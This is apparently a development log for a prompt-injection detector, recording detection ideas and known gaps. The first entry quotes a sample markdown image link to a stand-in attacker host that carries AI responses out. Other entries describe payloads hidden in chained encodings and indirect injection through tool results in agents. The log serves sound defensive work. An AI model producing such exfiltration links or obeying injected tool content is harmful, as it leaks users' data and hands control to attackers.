# Security Research Log

This is a chronological, append-only log of security discoveries made during SafePaste development sessions. Entries capture observations, hypotheses, and insights about prompt injection attacks that don't yet belong in the attack taxonomy or detection strategies.

**When an entry matures into actionable work**, it gets promoted:
- New attack technique → `docs/security/attack-taxonomy.md`
- Detection improvement → `docs/security/detection-strategies.md` or `packages/shared/patterns.js`
- Backlog item → `docs/backlog.md`

**Entry format:** Date, session #, observation, classification, action.

---

## Entries

### 2026-01-15 — Session #0 (pre-documentation)
**Classification:** Detection improvement idea
**Observation:** Exfiltration via markdown image links (`![](https://evil.com/steal?data=...)`) is uniquely dangerous because it can silently transmit AI responses to an attacker's server. Unlike other attack categories, exfiltration should never be dampened by benign context detection — even in educational content, a live exfiltration link is a real threat.
**Action:** Implemented. `applyDampening()` in `detect.js` checks `hasExfiltrationMatch()` and skips dampening if true. Exfiltration patterns always trigger at full weight.

### 2026-01-15 — Session #0 (pre-documentation)
**Classification:** New attack technique (undetected)
**Observation:** Encoding chains beyond base64/hex/rot13 are an open gap. Attackers can use custom encodings, cipher references, or multi-step encoding chains (e.g., "base64 decode this, then rot13 the result") to hide payloads. The current `encoding.obfuscated` pattern only catches direct references to three encoding types.
**Action:** Deferred. Added to "NOT YET DETECTED" section in attack-taxonomy.md. Addressing this requires either more encoding-specific patterns or a fundamentally different detection approach.

### 2026-03-12 — Session #1
**Classification:** New attack technique (undetected)
**Observation:** Indirect prompt injection via tool use is a growing threat in AI agent systems. When an agent uses tools (web search, code execution, document retrieval), the tool responses can contain injection payloads that the agent processes as trusted context. This attack vector is fundamentally different from direct clipboard-based injection because the user never sees the malicious text.
**Action:** Deferred. Documented in attack taxonomy "NOT YET DETECTED" section. Addressing this is part of SDK roadmap Phase 3 (SafePaste Guard — agent runtime security).
